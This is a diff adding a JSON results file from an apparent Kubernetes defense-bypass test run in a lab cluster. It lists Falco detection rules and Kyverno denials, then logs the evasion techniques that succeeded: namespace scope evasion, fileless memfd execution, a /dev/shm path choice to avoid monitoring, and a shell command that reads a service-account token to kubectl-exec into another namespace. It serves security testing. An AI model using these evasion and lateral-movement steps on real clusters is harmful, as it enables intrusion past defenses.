+      "sd_mod"
+    ],
+    "rulesets": [
+      {
+        "product": "falco",
+        "path": "/proc/15639/root/etc/falco/falco_rules.yaml",
+        "sha256": "30a1a60263ab97650c851011468da03b17fc0096a7cfa3b6686eba5de73b865b",
+        "rule_count": 25,
+        "rules": [
+          "Directory traversal monitored file read",
+          "Read sensitive file trusted after startup",
+          "Read sensitive file untrusted",
+          "Run shell untrusted",
+          "System user interactive",
+          "Terminal shell in container",
+          "Contact K8S API Server From Container",
+          "Netcat Remote Code Execution in Container",
+          "Search Private Keys or Passwords",
+          "Clear Log Activities",
+          "Remove Bulk Data from Disk",
+          "Create Symlink Over Sensitive Files",
+          "Create Hardlink Over Sensitive Files",
+          "Packet socket created in container",
+          "Redirect STDOUT/STDIN to Network Connection in Container",
+          "Linux Kernel Module Injection Detected",
+          "Debugfs Launched in Privileged Container",
+          "Detect release_agent File Container Escapes",
+          "PTRACE attached to process",
+          "PTRACE anti-debug attempt",
+          "Find AWS Credentials",
+          "Execution from /dev/shm",
+          "Drop and execute new binary in container",
+          "Disallowed SSH Connection Non Standard Port",
+          "Fileless execution via memfd_create"
+        ],
+        "interesting_rules": [
+          "terminal-shell",
+          "k8s-api-contact",
+          "drop-execute"
+        ],
+        "parse": "rule: prefix lines"
+      }
+    ],
+    "sensor": {
+      "falco": {
+        "running": true,
+        "pid": 15639,
+        "comm": "falco",
+        "btf": true,
+        "kernel_module": false,
+        "driver": "modern_ebpf_inferred",
+        "rulesets": 1
+      },
+      "kyverno": {
+        "pods": [
+          {
+            "name": "kyverno-admission-controller-69f6769c79-jnbsk",
+            "namespace": "kyverno",
+            "phase": "Running",
+            "images": [
+              "reg.kyverno.io/kyverno/kyverno:v1.19.2"
+            ]
+          }
+        ]
+      },
+      "btf": true,
+      "modern_ebpf_possible": true
+    }
+  },
+  "phases": {
+    "kyverno_scope": {
+      "control_rc": 1,
+      "control_denied": true,
+      "bypass_rc": 0,
+      "admitted": true,
+      "node_marker": true,
+      "marker": "INKBLADE-BENIGN:defense-bypass:node:100447",
+      "escape_output": "uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\nCapEf<abs-path>",
+      "scope_default": {
+        "schema": "inkblade-bypass/1",
+        "ok": true,
+        "technique_id": "",
+        "techniques": [
+          "namespace-scope-evasion"
+        ],
+        "executions": [
+          {
+            "technique": "namespace-scope-evasion",
+            "ok": true,
+            "namespace": "default",
+            "labels": {
+              "kubernetes.io/metadata.name": "default"
+            },
+            "policy_count": 3,
+            "policies_in_scope": [],
+            "evasion": "namespace-outside-policy-scope"
+          }
+        ],
+        "fileless": false,
+        "artifact_paths": [],
+        "selected_path": null,
+        "scope": {
+          "technique": "namespace-scope-evasion",
+          "ok": true,
+          "namespace": "default",
+          "labels": {
+            "kubernetes.io/metadata.name": "default"
+          },
+          "policy_count": 3,
+          "policies_in_scope": [],
+          "evasion": "namespace-outside-policy-scope"
+        },
+        "service_account": null,
+        "benign": true,
+        "no_new_binary": false
+      },
+      "scope_defense_lab": {
+        "schema": "inkblade-bypass/1",
+        "ok": false,
+        "technique_id": "",
+        "techniques": [
+          "namespace-scope-evasion"
+        ],
+        "executions": [
+          {
+            "technique": "namespace-scope-evasion",
+            "ok": false,
+            "namespace": "defense-lab",
+            "labels": {
+              "defense-lab": "true",
+              "kubernetes.io/metadata.name": "defense-lab"
+            },
+            "policy_count": 3,
+            "policies_in_scope": [
+              "defense-lab-disallow-hostpath",
+              "defense-lab-disallow-privileged",
+              "defense-lab-require-automount-false"
+            ],
+            "evasion": "policy-in-scope"
+          }
+        ],
+        "fileless": false,
+        "artifact_paths": [],
+        "selected_path": null,
+        "scope": {
+          "technique": "namespace-scope-evasion",
+          "ok": false,
+          "namespace": "defense-lab",
+          "labels": {
+            "defense-lab": "true",
+            "kubernetes.io/metadata.name": "defense-lab"
+          },
+          "policy_count": 3,
+          "policies_in_scope": [
+            "defense-lab-disallow-hostpath",
+            "defense-lab-disallow-privileged",
+            "defense-lab-require-automount-false"
+          ],
+          "evasion": "policy-in-scope"
+        },
+        "service_account": null,
+        "benign": true,
+        "no_new_binary": false
+      },
+      "alerts": [
+        {
+          "source": "falco",
+          "time": "10:04:15.143252590",
+          "priority": "Notice",
+          "rule": "Unexpected connection to K8s API Server from container",
+          "detail": "connection=10.42.0.162:38670->10.43.0.1:443 lport=38670 rport=443 fd_type=ipv4 fd_proto=tcp evt_type=connect user=root user_uid=0 user_loginuid=-1 process=inkblade-probe proc_exepath=/opt/inkblade/inkblade-probe parent=containerd-shim command=inkblade-probe collect --read-only --max-output 8388608 terminal=0 container_id=dfb1f9deb782 container_name=probe container_image_repository=docker.io/library/alpine container_image_tag=3.21 k8s_pod_name=posture-recon k8s_ns_name=trident-bypass",
+          "fields": {
+            "connection": "10.42.0.162:38670->10.43.0.1:443",
+            "lport": "38670",
+            "rport": "443",
+            "fd_type": "ipv4",
+            "fd_proto": "tcp",
+            "evt_type": "connect",
+            "user": "root",
+            "user_uid": "0",
+            "user_loginuid": "-1",
+            "process": "inkblade-probe",
+            "proc_exepath": "/opt/inkblade/inkblade-probe",
+            "parent": "containerd-shim",
+            "command": "inkblade-probe collect --read-only --max-output 8388608",
+            "terminal": "0",
+            "container_id": "dfb1f9deb782",
+            "container_name": "probe",
+            "container_image_repository": "docker.io/library/alpine",
+            "container_image_tag": "3.21",
+            "k8s_pod_name": "posture-recon",
+            "k8s_ns_name": "trident-bypass"
+          },
+          "raw": "10:04:15.143252590: Notice Unexpected connection to K8s API Server from container | connection=10.42.0.162:38670->10.43.0.1:443 lport=38670 rport=443 fd_type=ipv4 fd_proto=tcp evt_type=connect user=root user_uid=0 user_loginuid=-1 process=inkblade-probe proc_exepath=/opt/inkblade/inkblade-probe parent=containerd-shim command=inkblade-probe collect --read-only --max-output 8388608 terminal=0 container_id=dfb1f9deb782 container_name=probe container_image_repository=docker.io/library/alpine container_image_tag=3.21 k8s_pod_name=posture-recon k8s_ns_name=trident-bypass",
+          "technique_ids": [
+            "sa-permission-selection"
+          ]
+        }
+      ],
+      "denials": [
+        {
+          "source": "kyverno",
+          "webhook": "vpol.validate.kyverno.svc-fail-finegrained-defense-lab-disallow-hostpath",
+          "policy": "defense-lab-disallow-hostpath",
+          "message": "hostPath volumes are disallowed in defense-lab.",
+          "raw": "Error from server: error when creating \"STDIN\": admission webhook \"vpol.validate.kyverno.svc-fail-finegrained-defense-lab-disallow-hostpath\" denied the request: Policy defense-lab-disallow-hostpath failed: hostPath volumes are disallowed in defense-lab."
+        },
+        {
+          "source": "kyverno",
+          "webhook": "vpol.validate.kyverno.svc-fail-finegrained-defense-lab-disallow-privileged",
+          "policy": "defense-lab-disallow-privileged",
+          "message": "Privileged mode is disallowed in defense-lab.",
+          "raw": "Error from server: error when creating \"/root/control-privileged.yaml\": admission webhook \"vpol.validate.kyverno.svc-fail-finegrained-defense-lab-disallow-privileged\" denied the request: Policy defense-lab-disallow-privileged failed: Privileged mode is disallowed in defense-lab."
+        }
+      ]
+    },
+    "lateral": {
+      "sa_check": {
+        "schema": "inkblade-bypass/1",
+        "ok": true,
+        "technique_id": "",
+        "techniques": [
+          "sa-permission-selection"
+        ],
+        "executions": [
+          {
+            "technique": "sa-permission-selection",
+            "ok": true,
+            "subject": "system:serviceaccount:trident-bypass:bypass-exec",
+            "claims": {
+              "aud": [
+                "https://kubernetes.default.svc.cluster.local",
+                "k3s"
+              ],
+              "exp": 1824631392,
+              "iat": 1793095392,
+              "iss": "https://kubernetes.default.svc.cluster.local",
+              "jti": "29b70565-87ba-406a-963e-ea8fb056df14",
+              "kubernetes.io": {
+                "namespace": "trident-bypass",
+                "node": {
+                  "name": "k3s",
+                  "uid": "a42c0e6e-1e1d-4213-92d4-9eeaef2f4f6d"
+                },
+                "pod": {
+                  "name": "memfd-attacker",
+                  "uid": "904be428-9548-46b4-a397-507b58d3071f"
+                },
+                "serviceaccount": {
+                  "name": "bypass-exec",
+                  "uid": "d82e4912-c070-44d9-9307-8df0464e749e"
+                },
+                "warnafter": 1793098999
+              },
+              "nbf": 1793095392,
+              "sub": "system:serviceaccount:trident-bypass:bypass-exec"
+            },
+            "namespace": "trident-target",
+            "allowed": [
+              "pods/exec",
+              "pods"
+            ],
+            "checks": [
+              {
+                "action": "pods/exec",
+                "allowed": true,
+                "reason": "RBAC: allowed by RoleBinding \"bypass-exec-pods/trident-target\" of Role \"bypass-exec-pods\" to ServiceAccount \"bypass-exec/trident-bypass\""
+              },
+              {
+                "action": "pods",
+                "allowed": true,
+                "reason": "RBAC: allowed by RoleBinding \"bypass-exec-pods/trident-target\" of Role \"bypass-exec-pods\" to ServiceAccount \"bypass-exec/trident-bypass\""
+              },
+              {
+                "action": "secrets",
+                "allowed": false,
+                "reason": null
+              }
+            ],
+            "selected_action": "pods/exec"
+          }
+        ],
+        "fileless": false,
+        "artifact_paths": [],
+        "selected_path": null,
+        "scope": null,
+        "service_account": {
+          "technique": "sa-permission-selection",
+          "ok": true,
+          "subject": "system:serviceaccount:trident-bypass:bypass-exec",
+          "claims": {
+            "aud": [
+              "https://kubernetes.default.svc.cluster.local",
+              "k3s"
+            ],
+            "exp": 1824631392,
+            "iat": 1793095392,
+            "iss": "https://kubernetes.default.svc.cluster.local",
+            "jti": "29b70565-87ba-406a-963e-ea8fb056df14",
+            "kubernetes.io": {
+              "namespace": "trident-bypass",
+              "node": {
+                "name": "k3s",
+                "uid": "a42c0e6e-1e1d-4213-92d4-9eeaef2f4f6d"
+              },
+              "pod": {
+                "name": "memfd-attacker",
+                "uid": "904be428-9548-46b4-a397-507b58d3071f"
+              },
+              "serviceaccount": {
+                "name": "bypass-exec",
+                "uid": "d82e4912-c070-44d9-9307-8df0464e749e"
+              },
+              "warnafter": 1793098999
+            },
+            "nbf": 1793095392,
+            "sub": "system:serviceaccount:trident-bypass:bypass-exec"
+          },
+          "namespace": "trident-target",
+          "allowed": [
+            "pods/exec",
+            "pods"
+          ],
+          "checks": [
+            {
+              "action": "pods/exec",
+              "allowed": true,
+              "reason": "RBAC: allowed by RoleBinding \"bypass-exec-pods/trident-target\" of Role \"bypass-exec-pods\" to ServiceAccount \"bypass-exec/trident-bypass\""
+            },
+            {
+              "action": "pods",
+              "allowed": true,
+              "reason": "RBAC: allowed by RoleBinding \"bypass-exec-pods/trident-target\" of Role \"bypass-exec-pods\" to ServiceAccount \"bypass-exec/trident-bypass\""
+            },
+            {
+              "action": "secrets",
+              "allowed": false,
+              "reason": null
+            }
+          ],
+          "selected_action": "pods/exec"
+        },
+        "benign": true,
+        "no_new_binary": false
+      },
+      "memfd": {
+        "schema": "inkblade-bypass/1",
+        "ok": true,
+        "technique_id": "fileless-memfd-exec",
+        "techniques": [
+          "fileless-memfd-exec"
+        ],
+        "executions": [
+          {
+            "technique": "fileless-memfd-exec",
+            "ok": true,
+            "fileless": true,
+            "memfd": {
+              "name": "inkblade-bypass-8b8595fd",
+              "size": 311,
+              "path": "/proc/self/fd/3",
+              "fd": 3
+            },
+            "artifact_paths": [],
+            "no_new_binary": true,
+            "exit_code": 0,
+            "stdout": "",
+            "stderr": "",
+            "timed_out": false,
+            "duration_ms": 33095,
+            "argv": [
+              "/proc/self/fd/3"
+            ],
+            "result": {
+              "exit_code": 0,
+              "rc": 0,
+              "stdout": "",
+              "stderr": "",
+              "truncated": false,
+              "timed_out": false,
+              "duration_ms": 33095,
+              "argv": [
+                "/proc/self/fd/3"
+              ],
+              "clean_env": true,
+              "cwd": "/dev/shm"
+            }
+          }
+        ],
+        "fileless": true,
+        "artifact_paths": [],
+        "selected_path": null,
+        "scope": null,
+        "service_account": null,
+        "benign": true,
+        "no_new_binary": true
+      },
+      "existing_binary": {
+        "schema": "inkblade-bypass/1",
+        "ok": true,
+        "technique_id": "existing-binary-exec",
+        "techniques": [
+          "path-evasion",
+          "existing-binary-exec"
+        ],
+        "executions": [
+          {
+            "technique": "path-evasion",
+            "ok": true,
+            "selected": "/dev/shm",
+            "monitored_paths": [
+              "/tmp",
+              "/var/tmp"
+            ],
+            "candidates": [
+              "/dev/shm",
+              "/tmp",
+              "/var/tmp",
+              "/run",
+              "/opt/inkblade"
+            ],
+            "reason": "selected a writable/exec workspace outside the HIDS-monitored set"
+          },
+          {
+            "technique": "existing-binary-exec",
+            "ok": true,
+            "binary": "/bin/sh",
+            "binary_sha256": "aa1e1f4214ec2489ed373f3c5b92b7a7c665821a1decaa9685e5363886a93c7c",
+            "artifact_paths": [],
+            "no_new_binary": true,
+            "exit_code": 0,
+            "stdout": "",
+            "stderr": "",
+            "timed_out": false,
+            "argv": [
+              "/bin/sh",
+              "-c",
+              "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\nexec /opt/inkblade/kubectl --server=https://kubernetes.default.svc --token=\"$TOKEN\" --insecure-skip-tls-verify exec -n trident-target lateral-target -- /bin/sh -c 'echo INKBLADE-BENIGN:defense-bypass:existing:100637 > /tmp/lateral-existing.marker'\n"
+            ],
+            "result": {
+              "exit_code": 0,
+              "rc": 0,
+              "stdout": "",
+              "stderr": "",
+              "truncated": false,
+              "timed_out": false,
+              "duration_ms": 21178,
+              "argv": [
+                "/bin/sh",
+                "-c",
+                "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\nexec /opt/inkblade/kubectl --server=https://kubernetes.default.svc --token=\"$TOKEN\" --insecure-skip-tls-verify exec -n trident-target lateral-target -- /bin/sh -c 'echo INKBLADE-BENIGN:defense-bypass:existing:100637 > /tmp/lateral-existing.marker'\n"
+              ],
+              "clean_env": true,
+              "cwd": "/dev/shm"
+            }
+          }
+        ],
+        "fileless": false,
+        "artifact_paths": [],
+        "selected_path": "/dev/shm",
+        "scope": null,
+        "service_account": null,
+        "benign": true,
+        "no_new_binary": false
+      },
+      "target_marker": true,
+      "existing_marker": true
+    }
+  },
+  "counts": {
+    "attempted": 6,
+    "bypass-confirmed": 5,
+    "detected": 1,
+    "failed": 0
+  }
+}
